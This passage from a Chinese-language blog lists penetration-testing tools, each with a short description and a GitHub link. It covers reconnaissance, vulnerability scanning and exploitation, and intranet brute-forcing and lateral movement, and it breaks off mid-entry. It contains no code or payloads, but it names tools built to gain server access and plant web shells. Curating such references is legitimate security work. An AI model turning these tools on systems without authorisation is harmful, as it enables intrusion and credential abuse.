&lt;p&gt;Infoga 是一款能够在搜索引擎（Google、Bing、Shodan）和 PGP 密钥服务器等多种公共资源中搜集邮箱账户的工具。使用方法十分简单，看以下截图就一目了然了。这款工具对&lt;a href=&#34;http://www.52bug.cn/Security&#34;&gt;&lt;strong&gt;渗透&lt;/strong&gt;&lt;/a&gt;测试前期阶段的作用显而易见。我们也可以使用这款工具来查看自己公司在互联网上的曝光度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL200bGwway9pbmZvZ2E=&#34;&gt;https://github.com/m4ll0k/infoga&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;资产整理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产整理&#34;&gt;#&lt;/a&gt; 资产整理&lt;/h2&gt;
&lt;h3 id=&#34;arl-资产安全灯塔&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arl-资产安全灯塔&#34;&gt;#&lt;/a&gt; ARL - 资产安全灯塔&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;快速发现并整理企业外网资产，构建资产信息库，协助甲方安全团队或者渗透测试人员快速找到企业资产中的薄弱点和攻击面。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RvcGhhbnRUZWNobm9sb2d5L0FSTA==&#34;&gt;https://github.com/TophantTechnology/ARL&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sec-分布式资产安全扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sec-分布式资产安全扫描&#34;&gt;#&lt;/a&gt; SEC - 分布式资产安全扫描&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;SEC 可用于企业对服务器资源安全进行扫描排查，可控性强、可停止运行中的扫描任务、支持分布式多节点部署，更快的扫描进度 + 节点执行信息动态反馈，快速定位漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NtYWxsY2hhbS9zZWMtYWRtaW4=&#34;&gt;https://github.com/smallcham/sec-admin&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;w12scan-网络安全资产扫描引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#w12scan-网络安全资产扫描引擎&#34;&gt;#&lt;/a&gt; w12scan - 网络安全资产扫描引擎&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;w12scan 是一款网络资产发现引擎，通过 WEB 接口下发任务，w12scan 会自动将相关的资产聚合在一起方便分析使用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ctZGlnaXRhbC1zY2FubmVyL3cxMnNjYW4=&#34;&gt;https://github.com/w-digital-scanner/w12scan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;isee&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#isee&#34;&gt;#&lt;/a&gt; iSee&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;iSee 支持 FOFA 爬虫模式并能够在 fofa 搜索结果中提取整理资产信息，同时也是一款 SRC 挖掘神器，将 SRC 的资产信息黏贴到文本导入 iSee，得到的 b 段，c 段可以直接用 nmap, masscan 等工具进行扫描，有助于发现目标厂商的更多资产信息，尤其是防火墙，VPN 等设备的弱口令！ip 和域名可以直接导入 goby,awvs 等扫描器。&lt;br /&gt;
在 SRC 挖掘或者 hvv 红队视角下 iSee 旨在帮助渗透测试人员快速在信息收集得到的杂乱文本信息中整理出目标所有资产，以快速发现目标的脆弱资产。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RyMHVibGUtbUFrZXIvaVNlZQ==&#34;&gt;https://github.com/tr0uble-mAker/iSee&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;arl-资产侦察灯塔系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arl-资产侦察灯塔系统&#34;&gt;#&lt;/a&gt; ARL - 资产侦察灯塔系统&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RvcGhhbnRUZWNobm9sb2d5L0FSTA==&#34;&gt;https://github.com/TophantTechnology/ARL&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;漏洞检测利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞检测利用&#34;&gt;#&lt;/a&gt; 漏洞检测利用&lt;/h1&gt;
&lt;h2 id=&#34;脚本工具合集gui版&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#脚本工具合集gui版&#34;&gt;#&lt;/a&gt; 脚本工具合集 GUI 版&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;本项目的主要目的：针对日常收集的 Python POC\EXP 测试脚本，使用可视化界面统一执行入口，方便运行。本项目适合人群：有 Python 基础的渗透测试人员（工具自带简易编辑器，可修改脚本内参数，重新加载后可灵活使用脚本进行测试）。内置漏洞验证、利用模块，可自定义脚本实现批量验证。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NvZGV5c28vQ29kZVRlc3QuZ2l0JTYw&#34;&gt;https://github.com/codeyso/CodeTest.git&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;辅助渗透测试框架-polaris&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#辅助渗透测试框架-polaris&#34;&gt;#&lt;/a&gt; 辅助渗透测试框架 -- Polaris&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一个美观舒适的辅助渗透测试框架 (完善中)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RvaW1ldC9Qb2xhcmlz&#34;&gt;https://github.com/doimet/Polaris&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;banli-高危资产识别和高危漏洞扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#banli-高危资产识别和高危漏洞扫描&#34;&gt;#&lt;/a&gt; Banli - 高危资产识别和高危漏洞扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Banli 是一款极其简单好用的高危资产识别和高危漏洞扫描工具。本项目也是自己深入学习理解 Go 语言后计划陆续发布的项目之一。本项目仅用于安全研究人员在授权的情况下使用，请遵守网络安全法，若因本工具产生任何问题，后果请自负，与作者无关！程序代码中不会添加任何形式的后门，运行程序一般情况不会对系统产生危害，请各位师傅放心使用！本项目会持续更新，直到海枯石烂。作者：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzBlMHc=&#34;&gt;0e0w&lt;/span&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dvcWkvQmFubGk=&#34;&gt;https://github.com/Goqi/Banli&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;mdat-一款用于数据库攻击的利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mdat-一款用于数据库攻击的利用工具&#34;&gt;#&lt;/a&gt; MDAT - 一款用于数据库攻击的利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一款用于数据库攻击的利用工具，集合了多种主流的数据库类型。由团队成员 Ch1ng &amp;amp; j1anFen 共同完成开发。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURBVA==&#34;&gt;https://github.com/SafeGroceryStore/MDAT&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;webcrack-v22-弱口令检测工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webcrack-v22-弱口令检测工具&#34;&gt;#&lt;/a&gt; WebCrack  &lt;code&gt;v(2.2)&lt;/code&gt;  - 弱口令检测工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;WebCrack 是一款 web 后台弱口令 / 万能密码批量检测工具，在工具中导入后台地址即可进行自动化检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3l6ZGRtcjYvV2ViQ3JhY2s=&#34;&gt;https://github.com/yzddmr6/WebCrack&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;ppmap-基于go的漏洞扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ppmap-基于go的漏洞扫描器&#34;&gt;#&lt;/a&gt; ppmap - 基于 go 的漏洞扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;ppmap 是一款基于 Go 开发的漏洞扫描器 / 漏洞利用工具，该工具能够通过在全局上下文中检查特定变量来扫描、检测和利用 XSS 漏洞。该工具目前只能利用已知 Gadget（可能支持部分自定义开发的 Gadget）中的安全问题，但不支持代码分析或任何高级的漏洞扫描 / 利用方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tsZWl0b24weDAwL3BwbWFw&#34;&gt;https://github.com/kleiton0x00/ppmap&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;a2sv-ssl漏洞扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#a2sv-ssl漏洞扫描&#34;&gt;#&lt;/a&gt; A2SV - SSL 漏洞扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;自动扫描 SSL 漏洞。HeartBleed, CCS Injection, SSLv3 POODLE, FREAK... etc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9hMnN2&#34;&gt;https://github.com/hahwul/a2sv&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;siusiu-suitesuite-基于docker的渗透工具箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#siusiu-suitesuite-基于docker的渗透工具箱&#34;&gt;#&lt;/a&gt; siusiu （suitesuite）- 基于 docker 的渗透工具箱&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一款基于 docker 的渗透测试工具箱，致力于做到渗透工具随身携带、开箱即用。减少渗透测试工程师花在安装工具、记忆工具使用方法上的时间和精力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NoYW5nUnVpLWhhc2gvc2l1c2l1&#34;&gt;https://github.com/ShangRui-hash/siusiu&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;nginx漏洞扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx漏洞扫描&#34;&gt;#&lt;/a&gt; Nginx 漏洞扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nginxpwner 是一个简单的工具，可以查找常见的 Nginx 错误配置和漏洞&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N0YXJrMGRlL25naW54cHduZXI=&#34;&gt;https://github.com/stark0de/nginxpwner&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞挖掘工具-afrog&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞挖掘工具-afrog&#34;&gt;#&lt;/a&gt; 漏洞挖掘工具 -- afrog&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;afrog 是一个挖洞工具。如果你想挖 SQL 注入、XSS、文件包含等漏洞，可以试一下 afrog。软件有以下特点：&lt;br /&gt;
1、基于 xray 内核，又不像 xray&lt;br /&gt;
2、性能卓越，最少请求，最佳结果&lt;br /&gt;
 3、实时显示，扫描进度&lt;br /&gt;
 4、输出 html 报告，方便查看 request 和 response&lt;br /&gt;
5、启动程序，自动更新本地 PoC 库&lt;br /&gt;
 6、长期维护、更新 PoC（afrog-pocs）&lt;br /&gt;
7、API 接口，轻松接入其他项目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3phbjhpbi9hZnJvZw==&#34;&gt;https://github.com/zan8in/afrog&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;bomber&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bomber&#34;&gt;#&lt;/a&gt; Bomber&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;POC bomber 是一款漏洞检测工具，旨在利用大量高危害漏洞的 POC/EXP 快速获取目标服务器权限&lt;/p&gt;
&lt;p&gt;本项目收集互联网各种危害性大的 RCE・任意文件上传・sql 注入 等高危害且能够获取到服务器核心权限的漏洞 POC/EXP，并集成在 POC bomber 武器库中，利用大量高危害 POC 对单个或多个目标进行模糊测试，以此快速获取目标服务器权限，适合在红蓝对抗或 hvv 中帮助红队快速找到突破口进入内网&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RyMHVibGUtbUFrZXIvUE9DLWJvbWJlcg==&#34;&gt;https://github.com/tr0uble-mAker/POC-bomber&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;yaazhini-一款免费的android-apk和api漏洞扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yaazhini-一款免费的android-apk和api漏洞扫描器&#34;&gt;#&lt;/a&gt; Yaazhini - 一款免费的 Android APK 和 API 漏洞扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Yaazhini 是一款针对 Android APK 和 API 的免费漏洞扫描工具，这款工具提供了用户友好的操作界面，广大移动端安全研究人员可以在 Yaazhini 的帮助下，轻松扫描任何 Android 应用程序的 APK 文件以及 API 接口，而且 Yaazhini 还会给你提供非常丰富的扫描结果数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmVnYWJpcmQuY29tL3lhYXpoaW5pLw==&#34;&gt;https://www.vegabird.com/yaazhini/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;fuxploider-文件上传漏洞扫描器和利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuxploider-文件上传漏洞扫描器和利用工具&#34;&gt;#&lt;/a&gt; fuxploider - 文件上传漏洞扫描器和利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Fuxploider 是一种开源渗透测试工具，可自动检测和利用文件上传表单缺陷的过程。该工具能够检测允许上传的文件类型，并能够检测哪种技术最适合在所需的 Web 服务器上上传  &lt;code&gt;Web Shell&lt;/code&gt;  或任何恶意文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsbWFuZGluL2Z1eHBsb2lkZXI=&#34;&gt;https://github.com/almandin/fuxploider&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;xsstrike-xss扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xsstrike-xss扫描器&#34;&gt;#&lt;/a&gt; XSStrike - XSS 扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;XSStrike 是一个跨站点脚本检测套件，配备了四个手写解析器、一个智能负载生成器、一个强大的模糊引擎和一个非常快速的爬虫。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==&#34;&gt;https://github.com/s0md3v/XSStrike&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;auxtools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#auxtools&#34;&gt;#&lt;/a&gt; AuxTools&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 C++ 与 QML 混合编程开发的渗透辅助工具，其中包含：杀软识别、命令生成、编码解码、加密解密、端口扫描等功能，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RvaW1ldC9BdXhUb29scw==&#34;&gt;https://github.com/doimet/AuxTools&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;poc2jar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#poc2jar&#34;&gt;#&lt;/a&gt; poc2jar&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Java 编写，Python 作为辅助依赖的漏洞验证、利用工具，添加了进程查找模块、编码模块、命令模块、常见漏洞利用 GUI 模块、shiro rememberMe 解密模块，加快测试效率。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2YwbmcvcG9jMmphcg==&#34;&gt;https://github.com/f0ng/poc2jar&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;ethereal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ethereal&#34;&gt;#&lt;/a&gt; Ethereal&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Ethereal 是一款免费的网络协议分析程序，支持 Unix、Windows。借助这个程序，你既可以直接从网络上抓取数据进行分析，也可以对由其他嗅探器抓取后保存在硬盘上的数据进行分析。你能交互式地浏览抓取到的数据包，查看每一个数据包的摘要和详细信息。Ethereal 有多种强大的特征，如支持几乎所有的协议、丰富的过滤语言、易于查看 TCP 会话经重构后的数据流等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ldGhlcmVhbC5jb20v&#34;&gt;http://www.ethereal.com/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;cvechecker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cvechecker&#34;&gt;#&lt;/a&gt; cvechecker&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;cvechecker 的目标是通过扫描已安装的软件并将结果与 CVE 数据库进行匹配来报告系统上可能存在的漏洞。&lt;br /&gt;
官方提示：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;可能会产生许多误报（漏洞已通过修订版本修复，但该工具无法检测修订本身）。&lt;/li&gt;
&lt;li&gt;但是该工具也需要您的帮助。最多的工作是告诉 cvechecker 如何检测安装了哪个软件以及哪个版本。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAxOTAzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzY3MDE4&#34;&gt;https://blog.csdn.net/weixin_44019036/article/details/113767018&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;jsql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsql&#34;&gt;#&lt;/a&gt; jSQL&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;jSQL 是一款轻量级安全测试工具，可以检测 SQL 注入漏洞。它跨平台（Windows, Linux, Mac OS X, Solaris）、开源且免费。&lt;br /&gt;
它提供了数据库查询、后台爆破、文件读取、Web shell、SQL Shell、文件上传、暴力枚举、编码、批量注入测试等强大的功能，是一款非常不错的工具，也是渗透测试人员的强大助手。它支持 GET\POST 注入，同时也可以进行 HTTP 头注入（这个需要用户自动构建）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==&#34;&gt;https://github.com/ron190/jsql-injection&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;nikto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nikto&#34;&gt;#&lt;/a&gt; Nikto&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nikto 是一款开放源代码的、功能强大的 WEB 扫描评估软件，能对 web 服务器多种安全项目进行测试的扫描软件，能在 230 多种服务器上扫描出 2600 多种有潜在危险的文件、CGI 及其他问题，它可以扫描指定主机的 WEB 类型、主机名、特定目录、COOKIE、特定 CGI 漏洞、返回主机允许的 http 模式等等。它也使用 LibWhiske 库，但通常比 Whisker 更新的更为频繁。Nikto 是网管安全人员必备的 WEB 审计工具之一。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N1bGxvL25pa3Rv&#34;&gt;https://github.com/sullo/nikto&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;dradis-漏洞利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dradis-漏洞利用工具&#34;&gt;#&lt;/a&gt; Dradis - 漏洞利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Dradis 框架是一种开源工具，使用户能够在安全评估期间特别是有效的信息和数据共享。功能包括简单的报告生成，附件支持，通过服务器插件和独立平台与现有系统和工具集成。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjk1MjUwOC9hcnRpY2xlL2RldGFpbHMvMTI0Mjg5ODA4&#34;&gt;https://blog.csdn.net/weixin_42952508/article/details/124289808&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;routersploit-路由器漏洞检测及利用框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#routersploit-路由器漏洞检测及利用框架&#34;&gt;#&lt;/a&gt; RouterSploit - 路由器漏洞检测及利用框架&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;RouteSploit 框架&lt;/strong&gt;是一款开源的漏洞检测及利用框架，其针对的对象主要为路由器等嵌入式设备。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdDkvcm91dGVyc3Bsb2l0&#34;&gt;https://github.com/threat9/routersploit&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;vega-platform-web安全测试平台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vega-platform-web安全测试平台&#34;&gt;#&lt;/a&gt; Vega Platform - Web 安全测试平台&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Vega 是一个开放源代码的 web 应用程序安全测试平台，Vega 能够帮助你验证 SQL 注入、跨站脚本（XSS）、敏感信息泄露和其它一些安全漏洞。 Vega 使用 Java 编写，有 GUI，可以在 Linux、OS X 和 windows 下运行。Vega 类似于 Paros Proxy, Fiddler, Skipfish and ZAproxy。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YmdyYXBoLmNvbS9wcm9kdWN0cy5odG1s&#34;&gt;http://subgraph.com/products.html&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;xenotix&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xenotix&#34;&gt;#&lt;/a&gt; Xenotix&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Xenotix XSS Exploit Framework&lt;/strong&gt; 是一款用于检测和利用 WEB 应用程序中的 XSS 漏洞的渗透测试工具。通过使用真实的浏览器引擎执行扫描，可以将代码注入到含有 xss 漏洞的 web 页面中，识别 payload 的反馈，来确保零误报的 XSS 检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FqaW5hYnJhaGFtL09XQVNQLVhlbm90aXgtWFNTLUV4cGxvaXQtRnJhbWV3b3Jr&#34;&gt;https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;http-请求走私检测工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-请求走私检测工具&#34;&gt;#&lt;/a&gt; HTTP 请求走私检测工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;HTTP 请求走私是一种高危漏洞，是一种攻击者走私模糊的 HTTP 请求以绕过安全控制并获得未经授权的访问以执行恶意活动的技术，该漏洞早在 2005 年就被 watchfire 发现，后来在 2019 年 8 月重新发现由 James Kettle - (albinowax) 发现并在 DEF CON 27 和 Black-Hat USA 上展示，要了解有关此漏洞的更多信息，您可以参考他在 Portswigger 网站上的详细研究博客。所以这个安全工具背后的想法是检测给定主机的 HRS 漏洞，检测基于给定排列的时间延迟技术，所以要了解更多关于这个工具的信息，我强烈建议你阅读我的博客文章这个工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Fuc2h1bWFucGF0dG5haWsvaHR0cC1yZXF1ZXN0LXNtdWdnbGluZw==&#34;&gt;https://github.com/anshumanpattnaik/http-request-smuggling&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;内网渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网渗透&#34;&gt;#&lt;/a&gt; 内网渗透&lt;/h1&gt;
&lt;h2 id=&#34;内网扫描以及验证工具-requesttemplate&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网扫描以及验证工具-requesttemplate&#34;&gt;#&lt;/a&gt; 内网扫描以及验证工具 -- RequestTemplate&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;1、可以快速、准确、全面、利用、检测内网当中存在的漏洞&lt;br /&gt;
 2、在内网渗透的过程当中，收集网段的连通性往往意味着攻击面的大小。常用的收集网段的命令并不能收集全面，只有爆破才是最全面的解决办法。&lt;br /&gt;
3、在内网渗透的过程当中，凭据的复用往往使我们的内网横向事半功倍。使用配置文件的方式配置密码字典效果显著。&lt;br /&gt;
4、使用 xray 的 poc 对内网的 web 服务进行漏洞扫描。&lt;br /&gt;
5、内置默认字典爆破 FTP、Memcached、MongoDB、MySQL、Oracle、Postgres、Redis、SMB、MSSQL、SSH、17010 的检测。&lt;br /&gt;
6、使用 java 语言对漏洞进行复现，验证，后利用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzFuN2VyZmFjZS9SZXF1ZXN0VGVtcGxhdGU=&#34;&gt;https://github.com/1n7erface/RequestTemplate&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;requesttemplate&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#requesttemplate&#34;&gt;#&lt;/a&gt; RequestTemplate&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;首款双语双端内网扫描以及验证工具&lt;br /&gt;
快速、准确、全面、利用、检测内网当中存在的漏洞&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzFuN2VyZmFjZS9SZXF1ZXN0VGVtcGxhdGU=&#34;&gt;https://github.com/1n7erface/RequestTemplate&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;inscan-开源扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inscan-开源扫描器&#34;&gt;#&lt;/a&gt; InScan - 开源扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;边界打点后的自动化内网工具，完全与服务端脱离。服务端只用于生成 poc，网段信息等配置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2luYnVnLXRlYW0vSW5TY2FuLw==&#34;&gt;https://github.com/inbug-team/InScan/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;yasso-亚索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yasso-亚索&#34;&gt;#&lt;/a&gt; Yasso - 亚索&lt;/h2&gt;
&lt;blockquote&gt;
